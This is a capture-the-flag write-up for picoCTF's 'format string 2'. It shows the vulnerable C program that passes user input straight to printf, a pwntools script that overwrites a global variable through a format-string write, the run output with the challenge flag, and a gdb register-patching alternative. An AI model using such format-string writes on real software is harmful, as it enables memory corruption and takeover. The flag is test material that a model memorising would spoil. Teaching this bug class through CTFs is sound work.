# format string 2

---
AUTHOR: SKRUBLAWD

Description
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

---


Source code:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}

```

---

here we can see that we need to make the sus variable = 0x67616c66 to get the flag:

We are goona use pwnlib.fmtstr — Format string bug exploitation tools to solve this challenge

Reference : [fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)

---


Let's get to the exploit:


```python
from pwn import *
ex = ELF('./vuln')
context.binary = ex
# p = process(ex.path)
p = remote("rhea.picoctf.net", 50564)

payload = fmtstr_payload(14, {ex.sym['sus']: 0x67616c66})

p.sendlineafter(b'say?', payload)
p.interactive()

```

Running the above explit:

```bash
❯ python3 exploit.py
[*] '/home/lynk/picoCTF/format-string-2/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to rhea.picoctf.net on port 50564: Done
[*] Switching to interactive mode

Here's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}[*] Got EOF while reading in interactive
$
```

---

flag: ```picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}```

---

---



There's also another way to playing around:

---

load the binary in gdb.

set a breakpoint in comparison if (sus == 0x67616c66)

change the registers value rax = 0x67616c66

and it will give you the flag.....locallly 

create a fake flag..........to test it out .........


---

```bash
❯ sudo gdb ./vuln
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 156 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $ida GDB functions (can be used with print/break)
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
------- tip of the day (disable with set show-tips off) -------
heap_config shows heap related configuration
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010a0  putchar@plt
0x00000000004010b0  puts@plt
0x00000000004010c0  printf@plt
0x00000000004010d0  fgets@plt
0x00000000004010e0  fflush@plt
0x00000000004010f0  fopen@plt
0x0000000000401100  __isoc99_scanf@plt
0x0000000000401110  _start
0x0000000000401140  _dl_relocate_static_pie
0x0000000000401150  deregister_tm_clones
0x0000000000401180  register_tm_clones
0x00000000004011c0  __do_global_dtors_aux
0x00000000004011f0  frame_dummy
0x00000000004011f6  main
0x0000000000401318  _fini
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:	endbr64
   0x00000000004011fa <+4>:	push   rbp
   0x00000000004011fb <+5>:	mov    rbp,rsp
   0x00000000004011fe <+8>:	sub    rsp,0x450
   0x0000000000401205 <+15>:	mov    edi,0x402008
   0x000000000040120a <+20>:	call   0x4010b0 <puts@plt>
   0x000000000040120f <+25>:	mov    rax,QWORD PTR [rip+0x2e52]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x0000000000401216 <+32>:	mov    rdi,rax
   0x0000000000401219 <+35>:	call   0x4010e0 <fflush@plt>
   0x000000000040121e <+40>:	lea    rax,[rbp-0x410]
   0x0000000000401225 <+47>:	mov    rsi,rax
   0x0000000000401228 <+50>:	mov    edi,0x40206e
   0x000000000040122d <+55>:	mov    eax,0x0
   0x0000000000401232 <+60>:	call   0x401100 <__isoc99_scanf@plt>
   0x0000000000401237 <+65>:	mov    edi,0x402075
   0x000000000040123c <+70>:	mov    eax,0x0
   0x0000000000401241 <+75>:	call   0x4010c0 <printf@plt>
   0x0000000000401246 <+80>:	lea    rax,[rbp-0x410]
   0x000000000040124d <+87>:	mov    rdi,rax
   0x0000000000401250 <+90>:	mov    eax,0x0
   0x0000000000401255 <+95>:	call   0x4010c0 <printf@plt>
   0x000000000040125a <+100>:	mov    edi,0xa
   0x000000000040125f <+105>:	call   0x4010a0 <putchar@plt>
   0x0000000000401264 <+110>:	mov    rax,QWORD PTR [rip+0x2dfd]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x000000000040126b <+117>:	mov    rdi,rax
   0x000000000040126e <+120>:	call   0x4010e0 <fflush@plt>
   0x0000000000401273 <+125>:	mov    eax,DWORD PTR [rip+0x2de7]        # 0x404060 <sus>
   0x0000000000401279 <+131>:	cmp    eax,0x67616c66
   0x000000000040127e <+136>:	jne    0x4012df <main+233>
   0x0000000000401280 <+138>:	mov    edi,0x402090
   0x0000000000401285 <+143>:	call   0x4010b0 <puts@plt>
   0x000000000040128a <+148>:	mov    esi,0x4020d6
   0x000000000040128f <+153>:	mov    edi,0x4020d8
   0x0000000000401294 <+158>:	call   0x4010f0 <fopen@plt>
   0x0000000000401299 <+163>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040129d <+167>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004012a1 <+171>:	lea    rax,[rbp-0x450]
   0x00000000004012a8 <+178>:	mov    esi,0x40
   0x00000000004012ad <+183>:	mov    rdi,rax
   0x00000000004012b0 <+186>:	call   0x4010d0 <fgets@plt>
   0x00000000004012b5 <+191>:	lea    rax,[rbp-0x450]
   0x00000000004012bc <+198>:	mov    rsi,rax
   0x00000000004012bf <+201>:	mov    edi,0x4020e1
   0x00000000004012c4 <+206>:	mov    eax,0x0
   0x00000000004012c9 <+211>:	call   0x4010c0 <printf@plt>
   0x00000000004012ce <+216>:	mov    rax,QWORD PTR [rip+0x2d93]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x00000000004012d5 <+223>:	mov    rdi,rax
   0x00000000004012d8 <+226>:	call   0x4010e0 <fflush@plt>
   0x00000000004012dd <+231>:	jmp    0x40130f <main+281>
   0x00000000004012df <+233>:	mov    eax,DWORD PTR [rip+0x2d7b]        # 0x404060 <sus>
   0x00000000004012e5 <+239>:	mov    esi,eax
   0x00000000004012e7 <+241>:	mov    edi,0x4020e4
   0x00000000004012ec <+246>:	mov    eax,0x0
   0x00000000004012f1 <+251>:	call   0x4010c0 <printf@plt>
   0x00000000004012f6 <+256>:	mov    edi,0x4020f0
   0x00000000004012fb <+261>:	call   0x4010b0 <puts@plt>
   0x0000000000401300 <+266>:	mov    rax,QWORD PTR [rip+0x2d61]        # 0x404068 <stdout@GLIBC_2.2.5>
   0x0000000000401307 <+273>:	mov    rdi,rax
   0x000000000040130a <+276>:	call   0x4010e0 <fflush@plt>
   0x000000000040130f <+281>:	mov    eax,0x0
   0x0000000000401314 <+286>:	leave
   0x0000000000401315 <+287>:	ret
End of assembler dump.
pwndbg> break *0x0000000000401279
Breakpoint 1 at 0x401279
pwndbg> run
Starting program: /home/lynk/picoCTF/format-string-2/vuln 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
hi...
Here's your input: hi...

Breakpoint 1, 0x0000000000401279 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────
*RAX  0x21737573
*RBX  0x7fffffffe468 —▸ 0x7fffffffe6c6 ◂— '/home/lynk/picoCTF/format-string-2/vuln'
*RCX  0x7ffff7ec44e0 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x4052a0 ◂— "Here's your input: hi...\nkes. Only a true wizard could change my suspicions. What do you have to say?\n"
*RDI  0x7ffff7f9d710 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x0
*R8   0xa
*R9   0x400
*R10  0x7ffff7dde138 ◂— 0x10001200003364 /* 'd3' */
*R11  0x202
 R12  0x0
*R13  0x7fffffffe478 —▸ 0x7fffffffe6ee ◂— 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2c0 ◂— 0x0
*R15  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64 
*RBP  0x7fffffffe350 ◂— 0x1
*RSP  0x7fffffffdf00 —▸ 0x7ffff7fcb7b0 ◂— 0xe001100000243
*RIP  0x401279 (main+131) ◂— cmp eax, 0x67616c66
───────────────────[ DISASM / x86-64 / set emulate on ]────────────────────
 ► 0x401279 <main+131>    cmp    eax, 0x67616c66
   0x40127e <main+136>    jne    main+233                      <main+233>
    ↓
   0x4012df <main+233>    mov    eax, dword ptr [rip + 0x2d7b] <sus>
   0x4012e5 <main+239>    mov    esi, eax
   0x4012e7 <main+241>    mov    edi, 0x4020e4
   0x4012ec <main+246>    mov    eax, 0
   0x4012f1 <main+251>    call   printf@plt                      <printf@plt>
 
   0x4012f6 <main+256>    mov    edi, 0x4020f0
   0x4012fb <main+261>    call   puts@plt                      <puts@plt>
 
   0x401300 <main+266>    mov    rax, qword ptr [rip + 0x2d61] <stdout@GLIBC_2.2.5>
   0x401307 <main+273>    mov    rdi, rax
─────────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp 0x7fffffffdf00 —▸ 0x7ffff7fcb7b0 ◂— 0xe001100000243
01:0008│-448 0x7fffffffdf08 —▸ 0x7ffff7ffdab0 (_rtld_global+2736) —▸ 0x7ffff7fcb000 ◂— 0x3010102464c457f
02:0010│-440 0x7fffffffdf10 —▸ 0x7fffffffe030 —▸ 0x7ffff7dcab88 ◂— 0xbdf00000bd9
03:0018│-438 0x7fffffffdf18 —▸ 0x7ffff7fd4fc8 (_dl_lookup_symbol_x+296) ◂— add rsp, 0x30
04:0020│-430 0x7fffffffdf20 ◂— 0x1
05:0028│-428 0x7fffffffdf28 —▸ 0x7fffffffe060 ◂— 0x1
06:0030│-420 0x7fffffffdf30 ◂— 0x0
07:0038│-418 0x7fffffffdf38 —▸ 0x7ffff7fcbca8 ◂— 0x31fe8
───────────────────────────────[ BACKTRACE ]───────────────────────────────
 ► 0         0x401279 main+131
   1   0x7ffff7decc8a __libc_start_call_main+122
   2   0x7ffff7decd45 __libc_start_main+133
   3         0x401135 _start+37
───────────────────────────────────────────────────────────────────────────
pwndbg> info registers
rax            0x21737573          561214835
rbx            0x7fffffffe468      140737488348264
rcx            0x7ffff7ec44e0      140737352844512
rdx            0x4052a0            4215456
rsi            0x0                 0
rdi            0x7ffff7f9d710      140737353733904
rbp            0x7fffffffe350      0x7fffffffe350
rsp            0x7fffffffdf00      0x7fffffffdf00
r8             0xa                 10
r9             0x400               1024
r10            0x7ffff7dde138      140737351901496
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffe478      140737488348280
r14            0x7ffff7ffd000      140737354125312
r15            0x403e18            4210200
rip            0x401279            0x401279 <main+131>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
pwndbg> x $rax
0x21737573:	Cannot access memory at address 0x21737573
pwndbg> set $rax = 0x67616c66
pwndbg> c
Continuing.
I have NO clue how you did that, you must be a wizard. Here you go...
flag{kant......}
[Inferior 1 (process 4987) exited normally]
pwndbg>
```

---
